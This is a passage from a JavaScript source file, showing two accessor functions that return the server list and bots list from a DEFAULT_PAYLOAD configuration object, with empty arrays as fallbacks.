  return DEFAULT_PAYLOAD.server_list || [];
}

export function getPayloadBots() {
  return DEFAULT_PAYLOAD.bots_list || [];
}
